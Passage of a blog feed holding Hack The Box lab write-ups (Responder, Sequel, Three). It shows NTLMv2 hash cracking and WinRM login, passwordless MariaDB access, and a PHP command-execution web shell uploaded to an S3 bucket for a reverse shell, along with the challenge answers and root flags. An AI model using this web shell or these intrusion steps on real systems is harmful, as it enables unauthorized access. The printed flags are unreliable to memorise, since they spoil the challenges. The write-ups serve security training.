+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"Administrator::RESPONDER:583a9235488cccb1:fdaa6c84ae9d9f9c07fe6209c9bcacfc:01010000000000006ae580018292db0181e8493b0080dafc0000000002000c0050005900550053004500520001000c0050005900550053004500520004000c0070007900750073006500720003001a007000790075007300650072002e00700079007500730065007200070008006ae580018292db0106000400020000000800300030000000000000000100000000200000686b285cdf2e3909b8b49869d0cc97afddfa35b723d2b709fdba9258165ba3f10a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330037000000000000000000"</span> <span class="o">&gt;</span> hash.txt
+</code></pre></div>    </div>
+  </li>
+  <li>Craking the HASH with John The Ripper
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">-w</span><span class="o">=</span>wordlists.txt hash.txt
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250311143658.png" alt="" /></p>
+  </li>
+</ul>
+
+<ol>
+  <li>Connect to WinRM
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.129.208.162 <span class="nt">-u</span> administrator <span class="nt">-p</span> badminton
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250311144043.png" alt="" /></p>
+  </li>
+</ol>
+
+<h2 id="tasks">Tasks</h2>
+
+<ol>
+  <li>When visiting the web service using the IP address, what is the domain that we are being redirected to?
+    <blockquote>
+      <p>unika.htb</p>
+    </blockquote>
+  </li>
+  <li>Which scripting language is being used on the server to generate webpages?
+    <blockquote>
+      <p>php</p>
+    </blockquote>
+  </li>
+  <li>What is the name of the URL parameter which is used to load different language versions of the webpage?
+    <blockquote>
+      <p>page</p>
+    </blockquote>
+  </li>
+  <li>Which of the following values for the <code class="language-plaintext highlighter-rouge">page</code> parameter would be an example of exploiting a Local File Include (LFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, “../../../../../../../../windows/system32/drivers/etc/hosts”, “minikatz.exe”
+    <blockquote>
+      <p>../../../../../../../../windows/system32/drivers/etc/hosts</p>
+    </blockquote>
+  </li>
+  <li>Which of the following values for the <code class="language-plaintext highlighter-rouge">page</code> parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, “../../../../../../../../windows/system32/drivers/etc/hosts”, “minikatz.exe”
+    <blockquote>
+      <p>//10.10.14.6/somefile</p>
+    </blockquote>
+  </li>
+  <li>What does NTLM stand for?
+    <blockquote>
+      <p>New Technology LAN Manager</p>
+    </blockquote>
+  </li>
+  <li>Which flag do we use in the Responder utility to specify the network interface?
+    <blockquote>
+      <p>-I</p>
+    </blockquote>
+  </li>
+  <li>There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as <code class="language-plaintext highlighter-rouge">john</code>, but the full name is what?.
+    <blockquote>
+      <p>Jonh The Ripper</p>
+    </blockquote>
+  </li>
+  <li>What is the password for the administrator user?
+    <blockquote>
+      <p>badminton</p>
+    </blockquote>
+  </li>
+  <li>We’ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
+    <blockquote>
+      <p>5985</p>
+    </blockquote>
+  </li>
+  <li>Submit root flag
+    <blockquote>
+      <p>ea81b7afddd03efaa0945333ed147fac</p>
+    </blockquote>
+  </li>
+</ol>
+
+<p><img src="/img2/Pasted%20image%2020250311144630.png" alt="" /></p>]]></content><author><name>PyUs3r</name><email>pyus3r@gmail.com</email></author><category term="hackthebox" /><category term="Very Easy" /><category term="LLMNR/NBT-NS poisoning" /><category term="NTLMv2s" /><summary type="html"><![CDATA[In this machine, we exploit LLMNR/NBT-NS poisoning to capture NTLMv2 hashes and crack them.]]></summary></entry><entry><title type="html">Sequel - Hack The Box</title><link href="http://localhost:4000/htb-writeup-sequel/" rel="alternate" type="text/html" title="Sequel - Hack The Box" /><published>2025-03-12T00:00:00+01:00</published><updated>2025-03-12T00:00:00+01:00</updated><id>http://localhost:4000/htb-writeup-sequel</id><content type="html" xml:base="http://localhost:4000/htb-writeup-sequel/"><![CDATA[<p><img src="/img2/Pasted%20image%2020250310111555.png" alt="" /></p>
+<h2 id="introduction">Introduction</h2>
+
+<blockquote>
+  <p>In this machine we are taking advantage of misconfigured MariaDB server credentials.</p>
+</blockquote>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<ol>
+  <li>Connectivity
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c1</span> 10.129.235.41
+</code></pre></div>    </div>
+  </li>
+  <li>Nmap
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.129.235.41
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250310112055.png" alt="" /></p>
+  </li>
+  <li>Check MySQL version with nmap
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p3306</span> 10.129.235.41
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250310112600.png" alt="" /></p>
+  </li>
+</ol>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-h</span> 10.129.235.41 <span class="nt">-u</span> root <span class="nt">--ssl</span><span class="o">=</span>OFF
+</code></pre></div></div>
+<p><img src="/img2/Pasted%20image%2020250310114129.png" alt="" /></p>
+<h2 id="tasks">Tasks</h2>
+
+<ol>
+  <li>During our scan, which port do we find serving MySQL
+    <blockquote>
+      <p>3306</p>
+    </blockquote>
+  </li>
+  <li>What community-developed MySQL version is the target running?
+    <blockquote>
+      <p>MariaDB</p>
+    </blockquote>
+  </li>
+  <li>When using the MySQL command line client, what switch do we need to use in order to specify a login username?
+    <blockquote>
+      <p>-u</p>
+    </blockquote>
+  </li>
+  <li>Which username allows us to log into this MariaDB instance without providing a password?
+    <blockquote>
+      <p>root</p>
+    </blockquote>
+  </li>
+  <li>In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?
+    <blockquote>
+      <p>*</p>
+    </blockquote>
+  </li>
+  <li>In SQL, what symbol do we need to end each query with?
+    <blockquote>
+      <p>;</p>
+    </blockquote>
+  </li>
+  <li>There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that’s unique to this host?
+    <blockquote>
+      <p>htb</p>
+    </blockquote>
+  </li>
+  <li>Submit root flag
+    <blockquote>
+      <p>7b4bec00d1a39e3dd4e021ec3d915da8</p>
+    </blockquote>
+  </li>
+</ol>
+
+<p><img src="/img2/Pasted%20image%2020250310114524.png" alt="" /></p>]]></content><author><name>PyUs3r</name><email>pyus3r@gmail.com</email></author><category term="hackthebox" /><category term="Very Easy" /><category term="MariaDB" /><summary type="html"><![CDATA[In this machine we are taking advantage of misconfigured MariaDB server credentials.]]></summary></entry><entry><title type="html">Three - Hack The Box</title><link href="http://localhost:4000/htb-writeup-three/" rel="alternate" type="text/html" title="Three - Hack The Box" /><published>2025-03-12T00:00:00+01:00</published><updated>2025-03-12T00:00:00+01:00</updated><id>http://localhost:4000/htb-writeup-three</id><content type="html" xml:base="http://localhost:4000/htb-writeup-three/"><![CDATA[<p><img src="/img2/Pasted%20image%2020250312103256.png" alt="" /></p>
+<h2 id="introduction">Introduction</h2>
+
+<blockquote>
+  <p>In this machine, we are taking advantage of a misconfigured Amazon S3 service by uploading malicious PHP files.</p>
+</blockquote>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<ol>
+  <li>Connectivity
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c1</span> 10.129.11.67
+</code></pre></div>    </div>
+  </li>
+  <li>Nmap
+    <pre><code class="language-nmap">nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.129.11.67
+</code></pre>
+    <p><img src="/img2/Pasted%20image%2020250312103445.png" alt="" /></p>
+  </li>
+  <li>See the version of the service
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p22</span>,80 10.129.11.67
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250312103702.png" alt="" /></p>
+  </li>
+  <li>Discover web technologies
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.129.11.67/
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250312103954.png" alt="" /></p>
+  </li>
+  <li>Set domain in /etc/hosts
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.129.11.67 thetoppers.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
+</code></pre></div>    </div>
+  </li>
+  <li>Discover subdomains with gobuster
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster vhost <span class="nt">-u</span> http://thetoppers.htb <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-t</span> 100 <span class="nt">--append-domain</span>
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250312105751.png" alt="" /></p>
+  </li>
+  <li>
+    <p>Set subdomain in /etc/hosts
+<img src="/img2/Pasted%20image%2020250312105912.png" alt="" /></p>
+  </li>
+  <li>
+    <p>Find the possible service of an s3 subdomain
+<img src="/img2/Pasted%20image%2020250312110208.png" alt="" /></p>
+  </li>
+  <li>See the content of aws bucket
+    <ul>
+      <li>Discover the s3 bucket
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws s3 <span class="nb">ls</span> <span class="nt">--endpoint-url</span><span class="o">=</span>http://s3.thetoppers.htb <span class="nt">--no-sign-request</span>
+</code></pre></div>        </div>
+        <p><img src="/img2/Pasted%20image%2020250312112127.png" alt="" /></p>
+      </li>
+    </ul>
+  </li>
+</ol>
+
+<ul>
+  <li>Try to list s3 bucket content
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws s3 <span class="nb">ls </span>s3://thetoppers.htb <span class="nt">--endpoint</span><span class="o">=</span>http://s3.thetoppers.htb
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250312112248.png" alt="" /></p>
+  </li>
+  <li>Add credentials
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws configure
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250312112352.png" alt="" /></p>
+  </li>
+  <li>List s3 bucket content
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws s3 <span class="nb">ls </span>s3://thetoppers.htb <span class="nt">--endpoint</span><span class="o">=</span>http://s3.thetoppers.htb
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250312112511.png" alt="" /></p>
+  </li>
+</ul>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<ol>
+  <li>Upload test php file.
+    <ul>
+      <li>Create file
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'&lt;?php echo "PyUs3r" ?&gt;'</span> <span class="o">&gt;</span> whoami.php
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+</ol>
+
+<ul>
+  <li>Upload file
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws s3 <span class="nb">cp </span>whoami.php s3://thetoppers.htb <span class="nt">--endpoint</span><span class="o">=</span>http://s3.thetoppers.htb
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250312113110.png" alt="" /></p>
+  </li>
+  <li>Verify if a new file has been uploaded
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws s3 <span class="nb">ls </span>s3://thetoppers.htb <span class="nt">--endpoint</span><span class="o">=</span>http://s3.thetoppers.htb
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250312113427.png" alt="" /></p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://thetoppers.htb/whoami.php
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250312113532.png" alt="" /></p>
+  </li>
+</ul>
+
+<ol>
+  <li>Reverse shell
+    <ul>
+      <li>Create file
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'&lt;?php system($_GET["cmd"]); ?&gt;'</span> <span class="o">&gt;</span> cmd.php
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+</ol>
+
+<ul>
+  <li>Upload file
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws s3 <span class="nb">cp </span>cmd.php s3://thetoppers.htb <span class="nt">--endpoint</span><span class="o">=</span>http://s3.thetoppers.htb
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250312115449.png" alt="" /></p>
+  </li>
+  <li>Execute command
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://thetoppers.htb/cmd.php?cmd<span class="o">=</span><span class="nb">whoami</span>
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250312115547.png" alt="" /></p>
+  </li>
+  <li>Send reverse shell
+<img src="/img2/Pasted%20image%2020250312115655.png" alt="" />
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 9000
+</code></pre></div>    </div>
+    <p>![[Pasted image 20250312120135.png]]
+<img src="/img2/Pasted%20image%2020250312120309.png" alt="" /></p>
+  </li>
+</ul>
+
+<h2 id="tasks">Tasks</h2>
+
+<ol>
+  <li>How many TCP ports are open?
+    <blockquote>
+      <p>2</p>
+    </blockquote>
+  </li>
+  <li>What is the domain of the email address provided in the “Contact” section of the website?
+    <blockquote>
+      <p>thetoppers.htb</p>
+    </blockquote>
+  </li>
+  <li>In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?
+    <blockquote>
+      <p>/etc/hosts</p>
+    </blockquote>
+  </li>
+  <li>Which sub-domain is discovered during further enumeration?
+    <blockquote>
+      <p>s3.thetoppers.htb</p>
+    </blockquote>
+  </li>
+  <li>Which service is running on the discovered sub-domain?
+    <blockquote>
+      <p>amazon s3</p>
+    </blockquote>
+  </li>
+  <li>Which command line utility can be used to interact with the service running on the discovered sub-domain?
+    <blockquote>
+      <p>awscli</p>
+    </blockquote>
+  </li>
+  <li>Which command is used to set up the AWS CLI installation?
+    <blockquote>
+      <p>aws configure</p>
+    </blockquote>
+  </li>
+  <li>What is the command used by the above utility to list all of the S3 buckets?
+    <blockquote>
+      <p>aws s3 ls</p>
+    </blockquote>
+  </li>
+  <li>This server is configured to run files written in what web scripting language?
+    <blockquote>
+      <p>php</p>
+    </blockquote>
+  </li>
+  <li>Submit root flag
+    <blockquote>
+      <p>a980d99281a28d638ac68b9bf9453c2b</p>
+    </blockquote>
+  </li>
+</ol>
+
+<p><img src="/img2/Pasted%20image%2020250312120713.png" alt="" /></p>]]></content><author><name>PyUs3r</name><email>pyus3r@gmail.com</email></author><category term="hackthebox" /><category term="Very Easy" /><category term="Amazon S3" /><category term="cloud" /><category term="aws" /><summary type="html"><![CDATA[In this machine, we are taking advantage of a misconfigured Amazon S3 service by uploading malicious PHP files.]]></summary></entry></feed>
